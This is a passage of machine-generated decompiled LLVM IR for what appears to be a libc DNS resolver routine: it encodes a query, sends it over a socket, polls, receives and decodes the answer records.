  %v3_806500e = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_8064eb8)
  store i32 %v3_806500e, i32* %eax.global-to-local, align 4
  %v0_8065013 = load i32, i32* @esp, align 4
  %v1_8065013 = add i32 %v0_8065013, 28
  %v2_8065013 = inttoptr i32 %v1_8065013 to i32*
  %v3_8065013 = load i32, i32* %v2_8065013, align 4
  store i32 %v3_8065013, i32* %eax.global-to-local, align 4
  %v1_8065017 = add i32 %v0_8065013, 260
  %v2_8065017 = inttoptr i32 %v1_8065017 to i32*
  %v3_8065017 = load i32, i32* %v2_8065017, align 4
  store i32 %v3_8065017, i32* @edx, align 4
  %v2_806501e = add i32 %v0_8065013, 216
  %v3_806501e = inttoptr i32 %v2_806501e to i32*
  store i32 %v3_8065013, i32* %v3_806501e, align 4
  %v0_8065025 = load i32, i32* @edx, align 4
  %v1_8065025 = load i32, i32* @esp, align 4
  %v2_8065025 = add i32 %v1_8065025, 220
  %v3_8065025 = inttoptr i32 %v2_8065025 to i32*
  store i32 %v0_8065025, i32* %v3_8065025, align 4
  %v0_806502c = load i32, i32* @esp, align 4
  %v1_806502c = add i32 %v0_806502c, 224
  %v2_806502c = inttoptr i32 %v1_806502c to i32*
  store i32 1, i32* %v2_806502c, align 4
  %v0_806503c = load i32, i32* @esp, align 4
  %v1_806503f = load i32, i32* @ebx, align 4
  %v2_806503f = sub i32 512, %v1_806503f
  %v2_8065041 = add i32 %v0_806503c, 8
  %v3_8065041 = inttoptr i32 %v2_8065041 to i32*
  store i32 %v2_806503f, i32* %v3_8065041, align 4
  %v1_8065042 = load i32, i32* @ebx, align 4
  %v2_8065042 = add i32 %v1_8065042, %v2_8064e2a
  %v2_8065046 = add i32 %v0_806503c, 4
  %v3_8065046 = inttoptr i32 %v2_8065046 to i32*
  store i32 %v2_8065042, i32* %v3_8065046, align 4
  %v1_8065047 = add i32 %v0_806503c, 216
  store i32 %v1_8065047, i32* @eax, align 4
  %v3_806504e = inttoptr i32 %v0_806503c to i32*
  store i32 %v1_8065047, i32* %v3_806504e, align 4
  %v0_806504f = call i32 @__encode_question()
  store i32 %v0_806504f, i32* %eax.global-to-local, align 4
  %v0_8065054 = load i32, i32* @esp, align 4
  store i32 %v0_806504f, i32* @esi, align 4
  %v2_8065059 = icmp slt i32 %v0_806504f, 0
  br i1 %v2_8065059, label %dec_label_pc_80654bd, label %dec_label_pc_8065061

dec_label_pc_8065061:                             ; preds = %dec_label_pc_8065002
  %v1_8065061 = add i32 %v0_8065054, 172
  %v2_8065061 = inttoptr i32 %v1_8065061 to i16*
  store i16 2, i16* %v2_8065061, align 2
  %v1_806506b = load i32, i32* @esp, align 4
  %v2_806506b = add i32 %v1_806506b, -4
  %v3_806506b = inttoptr i32 %v2_806506b to i32*
  store i32 %v0_806504f, i32* %v3_806506b, align 4
  %v1_806506c = add i32 %v1_806506b, 164
  store i32 %v1_806506c, i32* %eax.global-to-local, align 4
  %v2_8065073 = add i32 %v1_806506b, -8
  %v3_8065073 = inttoptr i32 %v2_8065073 to i32*
  store i32 %v1_806506c, i32* %v3_8065073, align 4
  %v1_8065074 = add i32 %v1_806506b, 32
  %v2_8065074 = inttoptr i32 %v1_8065074 to i32*
  %v3_8065074 = load i32, i32* %v2_8065074, align 4
  %v5_8065074 = add i32 %v1_806506b, -12
  %v6_8065074 = inttoptr i32 %v5_8065074 to i32*
  store i32 %v3_8065074, i32* %v6_8065074, align 4
  %v1_8065078 = add i32 %v1_806506b, -16
  %v2_8065078 = inttoptr i32 %v1_8065078 to i32*
  store i32 10, i32* %v2_8065078, align 4
  %v5_806507a = call i32 @inet_pton(i32 -1, i8* %v4_806507a, i32 %v3_8064f17)
  store i32 %v5_806507a, i32* %eax.global-to-local, align 4
  %v0_806507f = load i32, i32* @esp, align 4
  %v1_806507f = add i32 %v0_806507f, 16
  %tmp51 = icmp slt i32 %v5_806507a, 1
  br i1 %tmp51, label %dec_label_pc_8065090, label %dec_label_pc_8065086

dec_label_pc_8065086:                             ; preds = %dec_label_pc_8065061
  %v1_8065086 = add i32 %v0_806507f, 172
  %v2_8065086 = inttoptr i32 %v1_8065086 to i16*
  store i16 10, i16* %v2_8065086, align 2
  %v0_8065090.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8065090

dec_label_pc_8065090:                             ; preds = %dec_label_pc_8065061, %dec_label_pc_8065086
  %v0_80650a7 = phi i32 [ %v1_806507f, %dec_label_pc_8065061 ], [ %v0_8065090.pre, %dec_label_pc_8065086 ]
  %v1_8065090 = add i32 %v0_80650a7, 156
  %v2_8065090 = inttoptr i32 %v1_8065090 to i16*
  %v3_8065090 = load i16, i16* %v2_8065090, align 2
  %v12_8065090 = icmp eq i16 %v3_8065090, 10
  %v1_8065099 = icmp eq i1 %v12_8065090, false
  %v1_80650a7 = add i32 %v0_80650a7, 158
  %v2_80650a7 = inttoptr i32 %v1_80650a7 to i16*
  store i16 13568, i16* %v2_80650a7, align 2
  %v0_80650b1 = load i32, i32* @esp, align 4
  br i1 %v1_8065099, label %dec_label_pc_80650a7, label %dec_label_pc_80650c7

dec_label_pc_80650a7:                             ; preds = %dec_label_pc_8065090
  %v1_80650b4 = add i32 %v0_80650b1, 32
  %v2_80650b4 = inttoptr i32 %v1_80650b4 to i32*
  %v3_80650b4 = load i32, i32* %v2_80650b4, align 4
  %v5_80650b4 = add i32 %v0_80650b1, -16
  %v6_80650b4 = inttoptr i32 %v5_80650b4 to i32*
  store i32 %v3_80650b4, i32* %v6_80650b4, align 4
  %v1_80650b8 = call i32 @inet_addr(i32 -1)
  store i32 %v1_80650b8, i32* %eax.global-to-local, align 4
  %v1_80650bd = load i32, i32* @esp, align 4
  %v2_80650bd = add i32 %v1_80650bd, 176
  %v3_80650bd = inttoptr i32 %v2_80650bd to i32*
  store i32 %v1_80650b8, i32* %v3_80650bd, align 4
  %v0_80650c4 = load i32, i32* @esp, align 4
  %v1_80650c4 = add i32 %v0_80650c4, 16
  br label %dec_label_pc_80650c7

dec_label_pc_80650c7:                             ; preds = %dec_label_pc_8065090, %dec_label_pc_80650a7
  %v1_80650c7 = phi i32 [ %v1_80650c4, %dec_label_pc_80650a7 ], [ %v0_80650b1, %dec_label_pc_8065090 ]
  %v0_80650c7 = load i32, i32* @ecx, align 4
  %v2_80650c7 = add i32 %v1_80650c7, -4
  %v3_80650c7 = inttoptr i32 %v2_80650c7 to i32*
  store i32 %v0_80650c7, i32* %v3_80650c7, align 4
  %v1_80650c8 = add i32 %v1_80650c7, -8
  %v2_80650c8 = inttoptr i32 %v1_80650c8 to i32*
  store i32 17, i32* %v2_80650c8, align 4
  %v1_80650ca = add i32 %v1_80650c7, -12
  %v2_80650ca = inttoptr i32 %v1_80650ca to i32*
  store i32 2, i32* %v2_80650ca, align 4
  %v1_80650cc = add i32 %v1_80650c7, 156
  %v2_80650cc = inttoptr i32 %v1_80650cc to i16*
  %v3_80650cc = load i16, i16* %v2_80650cc, align 2
  %v4_80650cc = zext i16 %v3_80650cc to i32
  store i32 %v4_80650cc, i32* %eax.global-to-local, align 4
  %v2_80650d4 = add i32 %v1_80650c7, -16
  %v3_80650d4 = inttoptr i32 %v2_80650d4 to i32*
  store i32 %v4_80650cc, i32* %v3_80650d4, align 4
  %v4_80650d5 = call i32 @socket(i32 -1, i32 %v15_8064eb8, i32 %v3_8064f17)
  store i32 %v4_80650d5, i32* %eax.global-to-local, align 4
  %v1_80650da = load i32, i32* @esp, align 4
  %v2_80650da = add i32 %v1_80650da, 36
  %v3_80650da = inttoptr i32 %v2_80650da to i32*
  store i32 %v4_80650d5, i32* %v3_80650da, align 4
  %v0_80650de = load i32, i32* @esp, align 4
  %v1_80650de = add i32 %v0_80650de, 16
  %v0_80650e1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80650e1 = icmp slt i32 %v0_80650e1, 0
  br i1 %v2_80650e1, label %dec_label_pc_806510e, label %dec_label_pc_80650e5

dec_label_pc_80650e5:                             ; preds = %dec_label_pc_80650c7
  %v1_80650e5 = add i32 %v0_80650de, 172
  store i32 %v1_80650e5, i32* %eax.global-to-local, align 4
  %v0_80650ec = load i32, i32* @edx, align 4
  %v2_80650ec = add i32 %v0_80650de, 12
  %v3_80650ec = inttoptr i32 %v2_80650ec to i32*
  store i32 %v0_80650ec, i32* %v3_80650ec, align 4
  %v1_80650ed = add i32 %v0_80650de, 8
  %v2_80650ed = inttoptr i32 %v1_80650ed to i32*
  store i32 28, i32* %v2_80650ed, align 4
  %v0_80650ef = load i32, i32* %eax.global-to-local, align 4
  %v2_80650ef = add i32 %v0_80650de, 4
  %v3_80650ef = inttoptr i32 %v2_80650ef to i32*
  store i32 %v0_80650ef, i32* %v3_80650ef, align 4
  %v1_80650f0 = add i32 %v0_80650de, 36
  %v2_80650f0 = inttoptr i32 %v1_80650f0 to i32*
  %v3_80650f0 = load i32, i32* %v2_80650f0, align 4
  %v6_80650f0 = inttoptr i32 %v0_80650de to i32*
  store i32 %v3_80650f0, i32* %v6_80650f0, align 4
  %v4_80650f4 = call i32 @__libc_connect(i32 -1, i32 %v15_8064eb8, i32 %v3_8064f17)
  store i32 %v4_80650f4, i32* %eax.global-to-local, align 4
  %v0_80650f9 = load i32, i32* @esp, align 4
  %v2_80650fc = icmp slt i32 %v4_80650f4, 0
  %v1_80650fe = icmp eq i1 %v2_80650fc, false
  br i1 %v1_80650fe, label %dec_label_pc_8065117, label %dec_label_pc_8065100

dec_label_pc_8065100:                             ; preds = %dec_label_pc_80650e5
  %v1_8065100 = call i32 @__errno_location(i32 -1)
  store i32 %v1_8065100, i32* %eax.global-to-local, align 4
  %v1_8065105 = inttoptr i32 %v1_8065100 to i32*
  %v2_8065105 = load i32, i32* %v1_8065105, align 4
  %v11_8065105 = icmp eq i32 %v2_8065105, 101
  %v0_8065477.pre = load i32, i32* @esp, align 4
  br i1 %v11_8065105, label %dec_label_pc_8065477, label %dec_label_pc_806510e

dec_label_pc_806510e:                             ; preds = %dec_label_pc_8065100, %dec_label_pc_80650c7
  %v17_806510e = phi i32 [ %v1_80650de, %dec_label_pc_80650c7 ], [ %v0_8065477.pre, %dec_label_pc_8065100 ]
  %v1_806510e = add i32 %v17_806510e, 28
  %v2_806510e = inttoptr i32 %v1_806510e to i32*
  %v3_806510e = load i32, i32* %v2_806510e, align 4
  %v4_806510e = add i32 %v3_806510e, 1
  store i32 %v4_806510e, i32* %v2_806510e, align 4
  br label %dec_label_pc_8065498.backedge

dec_label_pc_8065117:                             ; preds = %dec_label_pc_80650e5
  %v0_8065117 = load i32, i32* @ebx, align 4
  %v1_8065117 = load i32, i32* @esi, align 4
  %v2_8065117 = add i32 %v1_8065117, %v0_8065117
  store i32 %v2_8065117, i32* %eax.global-to-local, align 4
  %v1_806511a = add i32 %v0_80650f9, 12
  %v2_806511a = inttoptr i32 %v1_806511a to i32*
  store i32 0, i32* %v2_806511a, align 4
  %v0_806511c = load i32, i32* %eax.global-to-local, align 4
  %v2_806511c = add i32 %v0_80650f9, 8
  %v3_806511c = inttoptr i32 %v2_806511c to i32*
  store i32 %v0_806511c, i32* %v3_806511c, align 4
  %v2_806511d = add i32 %v0_80650f9, 4
  %v3_806511d = inttoptr i32 %v2_806511d to i32*
  store i32 %v2_8064e2a, i32* %v3_806511d, align 4
  %v1_806511e = add i32 %v0_80650f9, 36
  %v2_806511e = inttoptr i32 %v1_806511e to i32*
  %v3_806511e = load i32, i32* %v2_806511e, align 4
  %v6_806511e = inttoptr i32 %v0_80650f9 to i32*
  store i32 %v3_806511e, i32* %v6_806511e, align 4
  %v5_8065122 = call i32 @__libc_send(i32 -1, i32 %v15_8064eb8, i32 %v3_8064f17, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8065122, i32* %eax.global-to-local, align 4
  %v0_8065127 = load i32, i32* @esp, align 4
  %v1_8065127 = add i32 %v0_8065127, 36
  %v2_8065127 = inttoptr i32 %v1_8065127 to i32*
  %v3_8065127 = load i32, i32* %v2_8065127, align 4
  %v2_806512b = add i32 %v0_8065127, 228
  %v3_806512b = inttoptr i32 %v2_806512b to i32*
  store i32 %v3_8065127, i32* %v3_806512b, align 4
  %v0_8065132 = load i32, i32* @esp, align 4
  %v1_8065132 = add i32 %v0_8065132, 232
  %v2_8065132 = inttoptr i32 %v1_8065132 to i16*
  store i16 1, i16* %v2_8065132, align 2
  %v0_806513c = load i32, i32* @esp, align 4
  %v1_806513f = add i32 %v0_806513c, 8
  %v2_806513f = inttoptr i32 %v1_806513f to i32*
  store i32 10000, i32* %v2_806513f, align 4
  %v1_8065144 = add i32 %v0_806513c, 4
  %v2_8065144 = inttoptr i32 %v1_8065144 to i32*
  store i32 1, i32* %v2_8065144, align 4
  %v1_8065146 = add i32 %v0_806513c, 228
  store i32 %v1_8065146, i32* %eax.global-to-local, align 4
  %v3_806514d = inttoptr i32 %v0_806513c to i32*
  store i32 %v1_8065146, i32* %v3_806514d, align 4
  %v5_806514e = call i32 @__libc_poll(%pollfd* inttoptr (i32 -1 to %pollfd*), i32 %v15_8064eb8, i32 %v3_8064f17)
  store i32 %v5_806514e, i32* %eax.global-to-local, align 4
  %v0_8065153 = load i32, i32* @esp, align 4
  %v1_8065153 = add i32 %v0_8065153, 16
  %tmp52 = icmp slt i32 %v5_806514e, 1
  br i1 %tmp52, label %dec_label_pc_8065477, label %dec_label_pc_806515e

dec_label_pc_806515e:                             ; preds = %dec_label_pc_8065117
  %v1_806515e = add i32 %v0_8065153, 12
  %v2_806515e = inttoptr i32 %v1_806515e to i32*
  store i32 0, i32* %v2_806515e, align 4
  %v1_8065160 = add i32 %v0_8065153, 8
  %v2_8065160 = inttoptr i32 %v1_8065160 to i32*
  store i32 512, i32* %v2_8065160, align 4
  %v2_8065165 = add i32 %v0_8065153, 4
  %v3_8065165 = inttoptr i32 %v2_8065165 to i32*
  store i32 %v2_8064e2a, i32* %v3_8065165, align 4
  %v1_8065166 = add i32 %v0_8065153, 36
  %v2_8065166 = inttoptr i32 %v1_8065166 to i32*
  %v3_8065166 = load i32, i32* %v2_8065166, align 4
  %v6_8065166 = inttoptr i32 %v0_8065153 to i32*
  store i32 %v3_8065166, i32* %v6_8065166, align 4
  %v5_806516a = call i32 @__libc_recv(i32 -1, i32 %v15_8064eb8, i32 %v3_8064f17, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_806516a, i32* %eax.global-to-local, align 4
  %v1_806516f = load i32, i32* @esp, align 4
  %v2_806516f = add i32 %v1_806516f, 32
  %v3_806516f = inttoptr i32 %v2_806516f to i32*
  store i32 %v5_806516a, i32* %v3_806516f, align 4
  %v0_8065173 = load i32, i32* @esp, align 4
  %v1_8065173 = add i32 %v0_8065173, 16
  %v7_8065179 = icmp sgt i32 %v5_806516a, 11
  br i1 %v7_8065179, label %dec_label_pc_806517f, label %dec_label_pc_806542c

dec_label_pc_806517f:                             ; preds = %dec_label_pc_806515e
  %v0_806517f = load i32, i32* @ebx, align 4
  %v2_806517f = add i32 %v0_8065173, 12
  %v3_806517f = inttoptr i32 %v2_806517f to i32*
  store i32 %v0_806517f, i32* %v3_806517f, align 4
  %v0_8065180 = load i32, i32* @ebx, align 4
  %v2_8065180 = add i32 %v0_8065173, 8
  %v3_8065180 = inttoptr i32 %v2_8065180 to i32*
  store i32 %v0_8065180, i32* %v3_8065180, align 4
  %v1_8065181 = add i32 %v0_8065173, 84
  store i32 %v1_8065181, i32* %eax.global-to-local, align 4
  %v2_8065185 = add i32 %v0_8065173, 4
  %v3_8065185 = inttoptr i32 %v2_8065185 to i32*
  store i32 %v1_8065181, i32* %v3_8065185, align 4
  %v3_8065186 = inttoptr i32 %v0_8065173 to i32*
  store i32 %v2_8064e2a, i32* %v3_8065186, align 4
  %v0_8065187 = call i32 @__decode_header()
  store i32 %v0_8065187, i32* %eax.global-to-local, align 4
  %v0_806518c = load i32, i32* @esp, align 4
  %v1_806518c = add i32 %v0_806518c, 84
  %v2_806518c = inttoptr i32 %v1_806518c to i32*
  %v3_806518c = load i32, i32* %v2_806518c, align 4
  store i32 %v3_806518c, i32* %edx.global-to-local, align 4
  %v2_8065190 = add i32 %v0_806518c, 72
  %v3_8065190 = inttoptr i32 %v2_8065190 to i32*
  store i32 %v3_806518c, i32* %v3_8065190, align 4
  %v0_8065194 = load i32, i32* @esp, align 4
  %v1_8065194 = add i32 %v0_8065194, 16
  %v1_8065197 = add i32 %v0_8065194, 60
  %v2_8065197 = inttoptr i32 %v1_8065197 to i32*
  %v3_8065197 = load i32, i32* %v2_8065197, align 4
  store i32 %v3_8065197, i32* %eax.global-to-local, align 4
  %v0_806519b = load i32, i32* %edx.global-to-local, align 4
  %v12_806519b = icmp eq i32 %v0_806519b, %v3_8065197
  %v1_806519d = icmp eq i1 %v12_806519b, false
  br i1 %v1_806519d, label %dec_label_pc_806542c, label %dec_label_pc_80651a3

dec_label_pc_80651a3:                             ; preds = %dec_label_pc_806517f
  %v1_80651a3 = add i32 %v0_8065194, 88
  %v2_80651a3 = inttoptr i32 %v1_80651a3 to i32*
  %v3_80651a3 = load i32, i32* %v2_80651a3, align 4
  %v4_80651a3 = icmp eq i32 %v3_80651a3, 0
  br i1 %v4_80651a3, label %dec_label_pc_806542c, label %dec_label_pc_80651ae

dec_label_pc_80651ae:                             ; preds = %dec_label_pc_80651a3
  %v1_80651ae = add i32 %v0_8065194, 112
  %v2_80651ae = inttoptr i32 %v1_80651ae to i32*
  %v3_80651ae = load i32, i32* %v2_80651ae, align 4
  store i32 %v3_80651ae, i32* %eax.global-to-local, align 4
  %v9_80651b2 = icmp eq i32 %v3_80651ae, 3
  %v1_80651b5 = icmp eq i1 %v9_80651b2, false
  br i1 %v1_80651b5, label %dec_label_pc_806521d, label %dec_label_pc_80651b7

dec_label_pc_80651b7:                             ; preds = %dec_label_pc_80651ae
  %v1_80651b7 = add i32 %v0_8065194, 67
  %v2_80651b7 = inttoptr i32 %v1_80651b7 to i8*
  %v3_80651b7 = load i8, i8* %v2_80651b7, align 1
  %v4_80651b7 = icmp eq i8 %v3_80651b7, 0
  %v1_80651bc = icmp eq i1 %v4_80651b7, false
  br i1 %v1_80651bc, label %dec_label_pc_806520d, label %dec_label_pc_80651be

dec_label_pc_80651be:                             ; preds = %dec_label_pc_80651b7
  %v0_80651be = load i32, i32* @ecx, align 4
  %v2_80651be = add i32 %v0_8065194, 12
  %v3_80651be = inttoptr i32 %v2_80651be to i32*
  store i32 %v0_80651be, i32* %v3_80651be, align 4
  %v1_80651bf = add i32 %v0_8065194, 8
  %v2_80651bf = inttoptr i32 %v1_80651bf to i32*
  store i32 ptrtoint (i32* @global_var_807400c.761 to i32), i32* %v2_80651bf, align 4
  %v1_80651c4 = add i32 %v0_8065194, 4
  %v2_80651c4 = inttoptr i32 %v1_80651c4 to i32*
  store i32 134583465, i32* %v2_80651c4, align 4
  %v1_80651c9 = add i32 %v0_8065194, 200
  store i32 %v1_80651c9, i32* @esi, align 4
  %v3_80651d0 = inttoptr i32 %v0_8065194 to i32*
  store i32 %v1_80651c9, i32* %v3_80651d0, align 4
  %v5_80651d1 = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_8064eb8, i32 %v3_8064f17)
  store i32 %v5_80651d1, i32* %eax.global-to-local, align 4
  %v0_80651d6 = load i32, i32* @esp, align 4
  %v1_80651d6 = inttoptr i32 %v0_80651d6 to i32*
  store i32 ptrtoint (i32* @global_var_807400c.761 to i32), i32* %v1_80651d6, align 4
  %v1_80651dd = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_80651dd, i32* %eax.global-to-local, align 4
  %v0_80651e2 = load i32, i32* @esp, align 4
  %v1_80651e2 = inttoptr i32 %v0_80651e2 to i32*
  %v2_80651e2 = load i32, i32* %v1_80651e2, align 4
  store i32 %v2_80651e2, i32* %eax.global-to-local, align 4
  %v3_80651e2 = add i32 %v0_80651e2, 4
  %v1_80651e3 = inttoptr i32 %v3_80651e2 to i32*
  %v2_80651e3 = load i32, i32* %v1_80651e3, align 4
  store i32 %v2_80651e3, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_80651e3, align 4
  %v0_80651e6 = load i32, i32* @esi, align 4
  store i32 %v0_80651e6, i32* %v1_80651e2, align 4
  %v0_80651e7 = load i32, i32* @global_var_807e564.883, align 4
  store i32 %v0_80651e7, i32* @ebx, align 4
  %v3_80651ed = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_8064eb8)
  store i32 %v3_80651ed, i32* %eax.global-to-local, align 4
  %v0_80651f2 = load i32, i32* @esp, align 4
  %v0_80651f5 = load i32, i32* @ebx, align 4
  %v1_80651f5 = add i32 %v0_80651f5, -1
  store i32 %v1_80651f5, i32* @ebx, align 4
  %v1_80651f6 = add i32 %v0_80651f2, 52
  %v2_80651f6 = inttoptr i32 %v1_80651f6 to i32*
  %v3_80651f6 = load i32, i32* %v2_80651f6, align 4
  %v5_80651f6 = sub i32 %v3_80651f6, %v1_80651f5
  %v11_80651f6 = xor i32 %v3_80651f6, %v1_80651f5
  %v12_80651f6 = xor i32 %v5_80651f6, %v3_80651f6
  %v13_80651f6 = and i32 %v12_80651f6, %v11_80651f6
  %v14_80651f6 = icmp slt i32 %v13_80651f6, 0
  %v16_80651f6 = icmp slt i32 %v5_80651f6, 0
  %v2_80651fa = icmp eq i1 %v16_80651f6, %v14_80651f6
  br i1 %v2_80651fa, label %dec_label_pc_806520d, label %dec_label_pc_80651fc

dec_label_pc_80651fc:                             ; preds = %dec_label_pc_80651be
  %v4_80651fc = add i32 %v3_80651f6, 1
  store i32 %v4_80651fc, i32* %v2_80651f6, align 4
  %v0_8065200 = load i32, i32* @esp, align 4
  %v1_8065200 = add i32 %v0_8065200, 56
  %v2_8065200 = inttoptr i32 %v1_8065200 to i32*
  %v3_8065200 = load i32, i32* %v2_8065200, align 4
  store i32 %v3_8065200, i32* %edx.global-to-local, align 4
  %v2_8065204 = add i32 %v0_8065200, 44
  %v3_8065204 = inttoptr i32 %v2_8065204 to i32*
  store i32 %v3_8065200, i32* %v3_8065204, align 4
  br label %dec_label_pc_8065498.backedge

dec_label_pc_806520d:                             ; preds = %dec_label_pc_80651be, %dec_label_pc_80651b7
  %v0_806520d = call i32 @__GI___h_errno_location()
  store i32 %v0_806520d, i32* %eax.global-to-local, align 4
  %v1_8065212 = inttoptr i32 %v0_806520d to i32*
  store i32 1, i32* %v1_8065212, align 4
  br label %dec_label_pc_80654d0

dec_label_pc_806521d:                             ; preds = %dec_label_pc_80651ae
  %v1_806521d = icmp eq i32 %v3_80651ae, 0
  %v1_806521f = icmp eq i1 %v1_806521d, false
  br i1 %v1_806521f, label %dec_label_pc_806542c, label %dec_label_pc_8065225

dec_label_pc_8065225:                             ; preds = %dec_label_pc_806521d
  %v1_8065225 = add i32 %v0_8065194, 120
  %v2_8065225 = inttoptr i32 %v1_8065225 to i32*
  %v3_8065225 = load i32, i32* %v2_8065225, align 4
  %tmp53 = icmp slt i32 %v3_8065225, 1
  br i1 %tmp53, label %dec_label_pc_8065235, label %dec_label_pc_806522c

dec_label_pc_806522c:                             ; preds = %dec_label_pc_8065225
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_806525459 = add i32 %v0_8065194, 116
  %v3_806525460 = inttoptr i32 %v2_806525459 to i32*
  %v4_806525461 = load i32, i32* %v3_806525460, align 4
  %v5_806525462 = sub i32 0, %v4_806525461
  %v13_806525466 = and i32 %v4_806525461, %v5_806525462
  %v14_806525467 = icmp slt i32 %v13_806525466, 0
  %v16_806525469 = icmp slt i32 %v5_806525462, 0
  %v2_806525870 = icmp eq i1 %v16_806525469, %v14_806525467
  br i1 %v2_806525870, label %dec_label_pc_806525a, label %dec_label_pc_8065245

dec_label_pc_8065235:                             ; preds = %dec_label_pc_8065225
  %v0_8065235 = call i32 @__GI___h_errno_location()
  store i32 %v0_8065235, i32* %eax.global-to-local, align 4
  %v1_806523a = inttoptr i32 %v0_8065235 to i32*
  store i32 4, i32* %v1_806523a, align 4
  br label %dec_label_pc_80654d0

dec_label_pc_8065245:                             ; preds = %dec_label_pc_806522c, %dec_label_pc_8065245
  %v0_806525c72 = phi i32 [ %v1_8065251, %dec_label_pc_8065245 ], [ %v1_8065194, %dec_label_pc_806522c ]
  %v0_806524571 = phi i32 [ %v0_8065249, %dec_label_pc_8065245 ], [ %v3_80651ae, %dec_label_pc_806522c ]
  %v2_8065245 = add i32 %v0_806525c72, -4
  %v3_8065245 = inttoptr i32 %v2_8065245 to i32*
  store i32 %v0_806524571, i32* %v3_8065245, align 4
  %v0_8065246 = load i32, i32* %eax.global-to-local, align 4
  %v2_8065246 = add i32 %v0_806525c72, -8
  %v3_8065246 = inttoptr i32 %v2_8065246 to i32*
  store i32 %v0_8065246, i32* %v3_8065246, align 4
  %v0_8065247 = load i32, i32* @esi, align 4
  %v2_8065247 = add i32 %v0_806525c72, -12
  %v3_8065247 = inttoptr i32 %v2_8065247 to i32*
  store i32 %v0_8065247, i32* %v3_8065247, align 4
  %v2_8065248 = add i32 %v0_806525c72, -16
  %v3_8065248 = inttoptr i32 %v2_8065248 to i32*
  store i32 %v2_8064e2a, i32* %v3_8065248, align 4
  %v0_8065249 = call i32 @__length_question()
  store i32 %v0_8065249, i32* %eax.global-to-local, align 4
  %v0_806524e = load i32, i32* @ebx, align 4
  %v1_806524e = add i32 %v0_806524e, 1
  store i32 %v1_806524e, i32* @ebx, align 4
  %v0_806524f = load i32, i32* @esi, align 4
  %v2_806524f = add i32 %v0_806524f, %v0_8065249
  store i32 %v2_806524f, i32* @esi, align 4
  %v0_8065251 = load i32, i32* @esp, align 4
  %v1_8065251 = add i32 %v0_8065251, 16
  %v2_8065254 = add i32 %v0_8065251, 116
  %v3_8065254 = inttoptr i32 %v2_8065254 to i32*
  %v4_8065254 = load i32, i32* %v3_8065254, align 4
  %v5_8065254 = sub i32 %v1_806524e, %v4_8065254
  %v11_8065254 = xor i32 %v4_8065254, %v1_806524e
  %v12_8065254 = xor i32 %v5_8065254, %v1_806524e
  %v13_8065254 = and i32 %v12_8065254, %v11_8065254
  %v14_8065254 = icmp slt i32 %v13_8065254, 0
  %v16_8065254 = icmp slt i32 %v5_8065254, 0
  %v2_8065258 = icmp eq i1 %v16_8065254, %v14_8065254
  br i1 %v2_8065258, label %dec_label_pc_806525a, label %dec_label_pc_8065245

dec_label_pc_806525a:                             ; preds = %dec_label_pc_8065245, %dec_label_pc_806522c
  %v0_806525c.lcssa = phi i32 [ %v1_8065194, %dec_label_pc_806522c ], [ %v1_8065251, %dec_label_pc_8065245 ]
  store i32 0, i32* @ebx, align 4
  %v1_806525c = add i32 %v0_806525c.lcssa, 27
  %v2_806525c = inttoptr i32 %v1_806525c to i8*
  store i8 1, i8* %v2_806525c, align 1
  %v0_806538a.pre = load i32, i32* @ebx, align 4
  %v1_806538a.pre = load i32, i32* @esp, align 4
  %v2_806538a73 = add i32 %v1_806538a.pre, 104
  %v3_806538a74 = inttoptr i32 %v2_806538a73 to i32*
  %v4_806538a75 = load i32, i32* %v3_806538a74, align 4
  %v5_806538a76 = sub i32 %v0_806538a.pre, %v4_806538a75
  %v11_806538a78 = xor i32 %v4_806538a75, %v0_806538a.pre
  %v12_806538a79 = xor i32 %v5_806538a76, %v0_806538a.pre
  %v13_806538a80 = and i32 %v12_806538a79, %v11_806538a78
  %v14_806538a81 = icmp slt i32 %v13_806538a80, 0
  %v16_806538a83 = icmp slt i32 %v5_806538a76, 0
  %v2_806538e84 = icmp eq i1 %v16_806538a83, %v14_806538a81
  br i1 %v2_806538e84, label %dec_label_pc_806539a, label %dec_label_pc_8065390.lr.ph

dec_label_pc_8065390.lr.ph:                       ; preds = %dec_label_pc_806525a
  %v0_8065390.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8065390

dec_label_pc_8065266:                             ; preds = %dec_label_pc_8065390
  %v1_8065266 = add i32 %v0_806526685, 116
  store i32 %v1_8065266, i32* %eax.global-to-local, align 4
  %v2_806526a = add i32 %v0_806526685, -4
  %v3_806526a = inttoptr i32 %v2_806526a to i32*
  store i32 %v1_8065266, i32* %v3_806526a, align 4
  %v3_806526b = load i32, i32* %v3_8065390, align 4
  %v5_806526b = add i32 %v0_806526685, -8
  %v6_806526b = inttoptr i32 %v5_806526b to i32*
  store i32 %v3_806526b, i32* %v6_806526b, align 4
  %v0_806526f = load i32, i32* @esi, align 4
  %v2_806526f = add i32 %v0_806526685, -12
  %v3_806526f = inttoptr i32 %v2_806526f to i32*
  store i32 %v0_806526f, i32* %v3_806526f, align 4
  %v2_8065270 = add i32 %v0_806526685, -16
  %v3_8065270 = inttoptr i32 %v2_8065270 to i32*
  store i32 %v2_8064e2a, i32* %v3_8065270, align 4
  %v0_8065271 = call i32 @__decode_answer()
  store i32 %v0_8065271, i32* %eax.global-to-local, align 4
  %v1_8065276 = load i32, i32* @esp, align 4
  %v2_8065276 = add i32 %v1_8065276, 68
  %v3_8065276 = inttoptr i32 %v2_8065276 to i32*
  store i32 %v0_8065271, i32* %v3_8065276, align 4
  %v0_806527a = load i32, i32* @esp, align 4
  %v1_806527a = add i32 %v0_806527a, 16
  %v2_806527d = icmp slt i32 %v0_8065271, 0
  %v1_806527f = icmp eq i1 %v2_806527d, false
  br i1 %v1_806527f, label %dec_label_pc_8065299, label %dec_label_pc_8065281

dec_label_pc_8065281:                             ; preds = %dec_label_pc_8065266
  %v0_8065281 = load i32, i32* @ebx, align 4
  %v1_8065281 = icmp eq i32 %v0_8065281, 0
  br i1 %v1_8065281, label %dec_label_pc_806542c, label %dec_label_pc_8065289

